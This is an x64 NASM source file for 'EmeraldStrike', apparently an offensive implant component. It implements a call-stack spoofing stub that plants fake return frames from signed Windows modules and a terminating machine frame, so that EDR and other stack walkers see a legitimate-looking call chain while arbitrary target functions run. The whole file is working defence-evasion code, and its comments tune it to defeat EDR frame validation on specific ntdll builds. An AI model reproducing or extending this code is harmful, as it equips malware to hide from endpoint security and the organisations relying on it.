;   ------------------------------------------------------------------------------------
;   EmeraldStrike - LACUNA Ghost-Chain Call Stub (NASM, x64)
;   Based on LACUNA Chain (0xmaz, 2026).
;
;   Replaces the deprecated SilentMoonwalk desync (ADD RSP pivot + JMP [RBX]
;   gadget frames). The target is entered with:
;     [rsp+0x00] = ghost jmp [rbx] gadget  -> exec restore, walks as a leaf
;     [rsp+0x08..0x28) = L1..L4 ghosts      -> target shadow space (callee of
;                 syscall-class targets never spills into caller shadow home;
;                 dispatcher guards this primitive to 4 register args)
;     [rsp+0x28] = MfAnchor (KiUser*Dispatcher+4) -> real RUNTIME_FUNCTION
;                 whose UNWIND_INFO ends in UWOP_PUSH_MACHFRAME at offset 0
;     [rsp+0x30] = planted machine frame: Rip=0, Cs=0x33, EFlags=0x202,
;                 Rsp=0, Ss=0x2B -> unwinding the anchor consumes this frame
;                 and yields Rip=0: EVERY walker (ntdll-internal, EDR,
;                 exception dispatch) terminates cleanly.
;   Do NOT use RtlUserThreadStart+0x21 as the terminator: on ntdll 26100+
;   its unwind info is a plain ALLOC_SMALL frame - unwinding it reads
;   *(Rsp+0x48) from the CALLER's real frame and derails the walker into
;   garbage (dump-verified AV in ntdll!RtlVirtualUnwind2, T2 2026-11-09).
;   The unwinder pops each ghost as a leaf (Rip=[Rsp]; Rsp+=8), so the whole
;   chain is file-backed signed-module frames with genuinely valid geometry.
;
;   Layout at target entry (low -> high):
;     [gadget][L1][L2][L3][L4][mf-anchor][mf.Rip=0][mf.Cs][mf.EFlags][mf.Rsp=0][mf.Ss][restore-slot]
;   The restore slot lives at the top of the window: rbx points at it, so
;   jmp [rbx] lands in .restore. It is never read by the walk (the machframe
;   terminates the chain first).
;
;   PIC-safe: only struct offsets and RIP-relative addressing.
;   Max 4 register args - the C dispatcher routes >4-arg calls through the
;   stomp-window path instead (stack args would collide with the chain).
;   ------------------------------------------------------------------------------------

section .text
default rel

global ghost_spoof_call
global ghost_spoof_call_args
global ghost_restore

; GHOST_SPOOFER struct offsets - must match callstack_spoof.h exactly
%define S_NtdllBase              0x00
%define S_KernelBase             0x08
%define S_Win32uBase             0x10
%define S_GhostGadget            0x18
%define S_L1Ghost                0x20
%define S_L2Ghost                0x28
%define S_L3Ghost                0x30
%define S_L4NopGap               0x38
%define S_L5ThreadRoot           0x40
%define S_ChainMin               0x48
%define S_ChainMax               0x50
%define S_Target                 0x58
%define S_Nargs                  0x60
%define S_Arg1                   0x68
%define S_Arg2                   0x70
%define S_Arg3                   0x78
%define S_Arg4                   0x80
%define S_MfAnchor               0x88
%define S_PivotGadget            0x90
%define S_PivotImm               0x98
%define S_StackArgs              0xA0
%define S_PivotWindowRsp         0xA8

; ============================================================================
; ghost_spoof_call(PGHOST_SPOOFER pConfig)
;   rcx = pointer to GHOST_SPOOFER struct
; ============================================================================
ghost_spoof_call:
    ; save non-volatiles in the caller-provided shadow home
    mov     [rsp+08h], rbp
    mov     [rsp+10h], rbx

    ; anchor the real stack
    mov     rbp, rsp

    ; restore slot above the plant window: [rbp-8] = &ghost_restore
    lea     rax, [rel ghost_restore]
    push    rax
    mov     rbx, rsp                    ; rbx -> restore slot

    ; plant window: 0x58 keeps target-entry alignment (rsp ≡ 8 mod 16)
    ;   rsp = rbp-0x60 at the jmp. Slot map from rsp:
    ;   +0x00 gadget | +0x08..0x20 L1..L4 (shadow) | +0x28 mf-anchor
    ;   +0x30 mf.Rip=0 | +0x38 mf.Cs | +0x40 mf.EFlags | +0x48 mf.Rsp=0
    ;   +0x50 mf.Ss | +0x58 restore slot (rbx)
    ;   (0x60 would leave rsp ≡ 0 mod 16 at target entry - RtlCaptureContext's
    ;   aligned SSE saves fault on the misaligned probe: dump-verified AV at
    ;   ntdll!RtlCaptureContext, T2 2026-11-09)
    sub     rsp, 58h

    mov     rax, [rcx + S_GhostGadget]
    mov     [rsp+00h], rax
    mov     rax, [rcx + S_L1Ghost]
    mov     [rsp+08h], rax
    mov     rax, [rcx + S_L2Ghost]
    mov     [rsp+10h], rax
    mov     rax, [rcx + S_L3Ghost]
    mov     [rsp+18h], rax
    mov     rax, [rcx + S_L4NopGap]
    mov     [rsp+20h], rax
    mov     rax, [rcx + S_MfAnchor]
    mov     [rsp+28h], rax
    mov     qword [rsp+30h], 0          ; mf.Rip = 0 -> walk terminates
    mov     qword [rsp+38h], 33h        ; mf.Cs
    mov     qword [rsp+40h], 202h       ; mf.EFlags
    mov     qword [rsp+48h], 0          ; mf.Rsp
    mov     qword [rsp+50h], 2Bh        ; mf.Ss

    ; target address into a register the argument loads will not clobber
    mov     r11, [rcx + S_Target]

    ; ---- argument loading (1..4 register args) ----
    cmp     qword [rcx + S_Nargs], 4
    je      .handle_four
    cmp     qword [rcx + S_Nargs], 3
    je      .handle_three
    cmp     qword [rcx + S_Nargs], 2
    je      .handle_two
    cmp     qword [rcx + S_Nargs], 1
    je      .handle_one
    ; Nargs == 0: the target must not see the config pointer as arg1
    xor     ecx, ecx
    jmp     .execute

.handle_four:
    mov     r9, [rcx + S_Arg4]
    ; fall through
.handle_three:
    mov     r8, [rcx + S_Arg3]
    ; fall through
.handle_two:
    mov     rdx, [rcx + S_Arg2]
    ; fall through
.handle_one:
    mov     rcx, [rcx + S_Arg1]
    ; fall through

.execute:
    jmp     r11

; ============================================================================
; Calibration fault recovery (VEH-guarded setjmp pair).
; cs_measure_pivot arms a VEH, calls cs_calib_set(sav), then runs the real
; RtlVirtualUnwind on a synthetic context. Some .pdata entries make VU
; fault (near-NULL deref) on a synthetic context - the VEH redirects the
; faulting context into cs_calib_bail, which restores the saved frame and
; returns 1 from cs_calib_set. The candidate is then simply rejected.
; ============================================================================

; UINT64 cs_calib_set(void* sav)   ; sav = 8-qword save area
global cs_calib_set
cs_calib_set:
    mov     [rcx+00h], rsp
    mov     [rcx+08h], rbp
    mov     [rcx+10h], rbx
    mov     [rcx+18h], r12
    mov     [rcx+20h], r13
    mov     [rcx+28h], r14
    mov     [rcx+30h], r15
    mov     rax, [rsp]
    mov     [rcx+38h], rax          ; return address at save time
    xor     eax, eax
    ret

; VOID cs_calib_bail(void* sav)    ; entered by the VEH with rcx = sav
global cs_calib_bail
cs_calib_bail:
    mov     rsp, [rcx+00h]
    mov     rbp, [rcx+08h]
    mov     rbx, [rcx+10h]
    mov     r12, [rcx+18h]
    mov     r13, [rcx+20h]
    mov     r14, [rcx+28h]
    mov     r15, [rcx+30h]
    mov     rax, [rcx+38h]
    push    rax
    mov     eax, 1                  ; cs_calib_set returns 1 = faulted
    ret

; ============================================================================
; ghost_spoof_call_args(PGHOST_SPOOFER pConfig)
;   rcx = pointer to GHOST_SPOOFER struct. 5..11 total args (4 register
;   + 1..7 stack). Requires PivotGadget/PivotImm/StackArgs filled; the
;   dispatcher checks Nargs <= 4 + (PivotImm-0x20)/8 (PivotImm = the
;   containing function's declared frame size S).
;
;   Synthetic window carved out of OUR OWN unused stack BELOW rbp - real
;   frames above rbp are never touched, and the whole window stays inside
;   the TEB stack bounds (BYOUD-RT style frame validation passes).
;   Target entry rsp = R (16-byte aligned -8, ABI entry convention),
;   low -> high:
;     [R+0x00]      pivot gadget P (`jmp [rbx]` INSIDE a .pdata-covered
;                    function whose declared frame is S)
;     [R+0x08..0x20) shadow home args1-4 (callee-writable, NOT chain)
;     [R+0x28..]    stack args arg5..argN (copied from S_StackArgs)
;     [cb = R+8+S]  L1..L4 ghosts, MfAnchor, planted machine frame
;                    (Rip=0 -> walk terminates), restore slot (rbx)
;
;   EXECUTION: target rets -> P -> jmp [rbx] -> ghost_restore. The target
;     preserves rbx (callee-saved), so the restore-slot pointer survives.
;   WALK: unwinding the target yields RA=[R]=P at Rsp=R+8; VU replays P's
;     REAL prolog metadata from the mid-function RIP -> E_P = R+8+S ->
;     RA=[R+8+S]=L1 -> leaf pops L2..L4 -> MfAnchor consumes the planted
;     machframe -> Rip=0. Every walker terminates. The pivot is the
;     desync: execution takes the 2-byte jmp, the walker replays the
;     whole declared frame - the arg block in between is invisible to
;     the walk and untouched by execution.
; ============================================================================
ghost_spoof_call_args:
    ; save non-volatiles in the caller-provided shadow home
    mov     [rsp+08h], rbp
    mov     [rsp+10h], rbx

    ; anchor the real stack
    mov     rbp, rsp

    ; ---- compute R (target entry rsp), window lives below rbp ----
    ; window = S + 0x60 bytes (RA+shadow+args gap..chain incl. restore slot)
    ; R = ((rbp - 0x10 - total) & ~0xF) - 8   -> R == 8 (mod 16) guaranteed
    mov     rax, [rcx + S_PivotImm]
    lea     r10, [rax + 60h]           ; r10 = total window size
    mov     rax, rbp
    sub     rax, r10
    sub     rax, 10h
    and     rax, 0FFFFFFFFFFFFFFF0h
    sub     rax, 8                     ; rax = R
    mov     [rbp-10h], rax             ; scratch above the window: R
    mov     [rcx + S_PivotWindowRsp], rax  ; window base for the probe dump

    ; ---- plant the chain at cb = R + 8 + S ----
    mov     r11, [rcx + S_PivotImm]
    lea     rax, [rax + r11 + 8]       ; rax = cb
    mov     r11, [rcx + S_L1Ghost]
    mov     [rax+00h], r11             ; [cb]    = L1 (walk's next RA)
    mov     r11, [rcx + S_L2Ghost]
    mov     [rax+08h], r11
    mov     r11, [rcx + S_L3Ghost]
    mov     [rax+10h], r11
    mov     r11, [rcx + S_L4NopGap]
    mov     [rax+18h], r11
    mov     r11, [rcx + S_MfAnchor]
    mov     [rax+20h], r11
    mov     qword [rax+28h], 0         ; mf.Rip = 0 -> walk terminates
    mov     qword [rax+30h], 33h        ; mf.Cs
    mov     qword [rax+38h], 202h       ; mf.EFlags
    mov     qword [rax+40h], 0          ; mf.Rsp
    mov     qword [rax+48h], 2Bh        ; mf.Ss
    lea     r11, [rel ghost_restore]
    mov     [rax+50h], r11             ; restore slot
    lea     rbx, [rax+50h]             ; rbx -> restore slot (pivot's jmp [rbx])

    ; ---- RA slot + stack args ----
    mov     rax, [rbp-10h]             ; rax = R
    mov     r11, [rcx + S_PivotGadget]
    mov     [rax+00h], r11             ; [R] = pivot gadget
    lea     rax, [rax + 28h]           ; dest = R+0x28 (arg5 slot)
    mov     r10, [rcx + S_Nargs]
    sub     r10, 4                     ; stack-arg count (>=1 on this path)
    mov     r11, [rcx + S_StackArgs]
.copy_args:
    mov     r9, [r11]
    mov     [rax], r9
    add     r11, 8
    add     rax, 8
    dec     r10
    jnz     .copy_args

    ; ---- register args 1..4 + target (Nargs >= 5: all four are live) ----
    mov     r11, [rcx + S_Target]
    mov     r9, [rcx + S_Arg4]
    mov     r8, [rcx + S_Arg3]
    mov     rdx, [rcx + S_Arg2]
    mov     rcx, [rcx + S_Arg1]

    ; ---- teleport: rsp = R, jump to the target ----
    mov     rax, [rbp-10h]
    mov     rsp, rax
    jmp     r11

; ============================================================================
; ghost_restore - target RET hit the ghost gadget: jmp [rbx] lands here.
; Shared by ghost_spoof_call and ghost_spoof_call_args. Pivot back to the
; real stack (rbp anchors the caller frame) and return to the genuine caller.
; ============================================================================
ghost_restore:
    mov     rsp, rbp
    mov     rbp, [rsp+08h]
    mov     rbx, [rsp+10h]
    ret
